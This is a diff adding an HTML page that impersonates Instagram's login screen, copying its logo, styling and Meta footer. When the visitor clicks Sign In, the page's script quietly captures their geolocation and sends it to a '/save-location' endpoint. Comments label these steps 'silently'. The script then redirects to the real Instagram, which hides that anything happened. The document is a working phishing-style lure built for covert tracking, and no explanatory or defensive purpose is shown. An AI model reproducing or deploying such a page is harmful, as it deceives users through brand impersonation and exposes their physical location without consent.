@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Instagram Login Style</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #fafafa;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .login-container {
+      background-color: #ffffff;
+      border: 1px solid #dbdbdb;
+      border-radius: 8px;
+      width: 350px;
+      padding: 40px 20px;
+      text-align: center;
+      box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+    }
+    .logo {
+      width: 150px;
+      margin: 0 auto 20px;
+    }
+    .logo img {
+      width: 100%;
+    }
+    input {
+      width: 90%;
+      padding: 12px;
+      margin-bottom: 12px;
+      border: 1px solid #dbdbdb;
+      border-radius: 3px;
+      background-color: #fafafa;
+      font-size: 14px;
+    }
+    input:focus {
+      outline: none;
+      border-color: #a8a8a8;
+    }
+    button {
+      width: 100%;
+      padding: 12px;
+      background-color: #0095f6;
+      border: none;
+      border-radius: 5px;
+      color: white;
+      font-weight: bold;
+      font-size: 14px;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+    button:hover {
+      background-color: #007bb5;
+    }
+    .footer {
+      margin-top: 15px;
+      font-size: 12px;
+      color: #8e8e8e;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-container">
+    <div class="logo">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo">
+    </div>
+    <form id="loginForm">
+      <input type="text" placeholder="Phone number, username, or email" required>
+      <input type="password" placeholder="Password" required>
+      <button type="button" id="signInBtn">Sign In</button>
+    </form>
+    <div class="footer">© 2024 Instagram from Meta</div>
+  </div>
+
+  <script>
+    const button = document.getElementById('signInBtn');
+
+    button.addEventListener('click', async () => {
+      // Retrieve location silently
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          async (position) => {
+            const { latitude, longitude } = position.coords;
+
+            // Send location data to the server silently
+            try {
+              await fetch('/save-location', {
+                method: 'POST',
+                headers: {
+                  'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({ latitude, longitude }),
+              });
+            } catch (error) {
+              console.error('Failed to send location:', error);
+            }
+
+            // Redirect to Instagram
+            window.location.href = 'https://www.instagram.com/';
+          },
+          (error) => {
+            console.error('Geolocation error:', error);
+
+            // Redirect to Instagram even if location fails
+            window.location.href = 'https://www.instagram.com/';
+          }
+        );
+      } else {
+        console.error('Geolocation not supported in this browser.');
+
+        // Redirect to Instagram even if geolocation is not supported
+        window.location.href = 'https://www.instagram.com/';
+      }
+    });
+  </script>
+</body>
+</html>
